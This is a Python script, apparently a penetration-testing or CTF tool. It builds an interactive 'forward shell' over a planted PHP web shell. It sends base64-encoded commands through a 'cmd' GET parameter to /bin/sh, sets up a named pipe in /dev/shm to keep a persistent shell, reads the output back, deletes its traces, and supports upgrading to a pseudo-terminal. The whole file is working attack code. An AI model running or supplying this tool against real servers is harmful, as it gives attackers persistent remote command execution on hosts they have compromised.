#!/usr/bin/env python3
import requests
from termcolor import colored
from base64 import b64encode
from random import randrange
import time


class ForwardShell:
    def __init__(self):
        session = randrange(1000,9999)
        self.main_url = "http://localhost/index.php"
        self.stdin = f"/dev/shm/{session}.input"
        self.stdout = f"/dev/shm/{session}.output"
        self.is_pseudo_terminal = False

    def run_command(self, command):
        command = b64encode(command.encode()).decode()

        data= {
            'cmd': 'echo "%s" | base64 -d | /bin/sh' % command
        }

        try:
            r = requests.get(self.main_url, params=data, timeout=5)
            return r.text
        except:
            pass

        return None

    def write_stdin(self, command):
        command = b64encode(command.encode()).decode()

        data= {
            'cmd': 'echo "%s" | base64 -d > %s' % (command, self.stdin)
        }

        r = requests.get(self.main_url, params=data)


    def setup_shell(self):
        command = f"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (self.stdin, self.stdin, self.stdout)
        self.run_command(command)

    def remove_data(self):
        remove_data_command = f"/bin/rm {self.stdin} {self.stdout}"
        self.run_command(remove_data_command)

    def read_stdout(self):
        for _ in range(5):
            read_stdout_command = f"/bin/cat {self.stdout}"
            output_command = self.run_command(read_stdout_command)
            time.sleep(0.2)
        return output_command

    def clear_stdout(self):
        clear_stdout_command = f"echo '' > {self.stdout}"
        self.run_command(clear_stdout_command)

    def run(self):
        self.setup_shell()

        while True:
            command = input(colored(">> ", "yellow"))

            if "script /dev/null -c bash" in command:
                print(colored(f"\n[+] Se ha iniciado una pseudo terminal", "blue"))
                self.is_pseudo_terminal = True

            self.write_stdin(command + "\n")
            output_cmd = self.read_stdout()

            if self.is_pseudo_terminal:
                lines = output_cmd.split('\n')
                print(len(lines))
                print(lines)
            else:
                print(output_cmd)
                self.clear_stdout()

